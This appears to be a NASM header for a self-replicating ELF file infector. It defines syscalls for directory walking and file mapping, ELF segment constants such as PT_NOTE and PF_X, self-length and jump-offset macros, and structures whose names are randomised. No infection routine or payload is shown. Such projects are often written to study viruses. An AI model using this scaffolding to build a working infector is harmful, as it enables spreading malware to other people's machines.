; SYSCALL
%define     SYS_OPEN        2
%define     SYS_CLOSE       3
%define  SYS_LSEEK  8
%define  SYS_MMAP  9
%define  SYS_UNMAP  11
%define     SYS_EXIT        60
%define  SYS_FTRUNCATE 77
%define     SYS_GETDENTS    217

; OPEN
%define  O_RDONLY   0x0000
%define  O_WRONLY   0x0001
%define  O_RDWR    0x0002
%define  O_DIRECTORY   0q0200000

; DIRENT
%define  D_INO_OFF   0x00
%define  D_OFF_OFF   0x08
%define  D_RECLEN_OFF  0x10
%define  D_TYPE     0x12
%define  D_NAME     0x13
%define     D_REG_FILE          0x8

; MMAP
%define  PROT_EXEC  1
%define  PROT_READ  2
%define  PROT_WRITE  4
%define  MAP_SHARED  1

; LSEEK
%define  SEEK_SET   0x0
%define  SEEK_END   0x2

%define  FAM(x)    [(rbp - vIpwyUO8_size) + x]
%define  INF(x)    [(rbp - Hp2r39UiMa_size) + x]


%define  CODE_LEN  (sffRnF - _start)
%define  FINJMP_OFF  (Y8U3P - _start)
%define  PAGE_SIZE  0x1000


struc vIpwyUO8
.JVrBRyDiHX             resq    1
.r6ieUyrMx          resq    1
.DmWCpO9p0X                 resq    1
.TSyoY9O:           resb    PAGE_SIZE
.gFNJOS:        resd    1
.gQwXpO:     resd    1
.yHYam1PN3q resq    1
.UFNesJv4q resq 1
endstruc

struc Hp2r39UiMa
.MAo60   resq 1
.pNsDtvOr   resq 1
.UFNesJv4q   resq 1
.VeISq2    resb 1
.CheopBjw  resq 1
.r7B5uVRYUF resq 1
.dPrJVU resq 1
.R44md3  resq 1
.mQ7QAI0n  resq 1 
.vAk49lW  resq 1
.Tdlff  resq 1
.lCqTjEOuD   resb 1
.Ic9xq   resq 1
.sCmR3fA8I  resq 1
.lQgLUT  resq 1
endstruc

; ELF structures
%define PT_LOAD  0x1
%define PT_NOTE  0x4
%define PF_X  0x1
%define PF_R  0x4
%define SHT_PROGBITS 0x1
%define SHT_STRTAB 0x3
%define SHT_NOTE 0x7
%define SHT_RELA 0x4
%define SHF_ALLOC 0x2
%define SHF_EXECINSTR 0x4

struc h2viU9O
.Pmxcf:  resb 16
.LwLh2w:  resw 1
.V7vKIn2W:  resw 1
.CjM40qm:  resd 1
.XNvDp:  resq 1
.P4fER3Gm8m:  resq 1
.pCtMgY:  resq 1
.Fn9Mcz:  resd 1
.RlPfN49IG:  resw 1
.VWJMFA0c: resw 1
.h2FSBoG:  resw 1
.xRXeqLTa: resw 1
.aoWnmX:  resw 1
.XcGmvzZ: resw 1
endstruc

struc qtnMX2NULe
.ngVI1xF:  resd 1
.a28Bo:  resd 1
.BYNKkr:  resq 1
.kdixMj:  resq 1
.mh61y:  resq 1
.Hhvm9Q0pHM:  resq 1
.tEUTYFr8:  resq 1
.u2fIzVy:  resq 1
endstruc

struc PNvMO0
.Gwfyka:  resd 1
.rnIwV:  resd 1
.KPrIusqHE:  resq 1
.XSvoqKsb:  resq 1
.ZFmTx:  resq 1
.qjUZ9VvHE:  resq 1
.tMYONU:  resd 1
.ppWbf3:  resd 1
.fcdJckT resq 1
.bUJ1ey0  resq 1
endstruc

struc CIJ5l
.ueylOXGQkU  resq 1
.l2cA81MO   resq 1
.cCKbZ6BPbL  resq 1
endstruc

%macro PUSHA 0
push rax
push rbx
push rcx
push rdx
push rsi
push rdi
push r8
push r9
push r10
push r11
push r12
push r13
push r14
push r15
%endmacro

%macro POPA 0
pop r15
pop r14
pop r13
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdi
pop rsi
pop rdx
pop rcx
pop rbx
pop rax
%endmacro 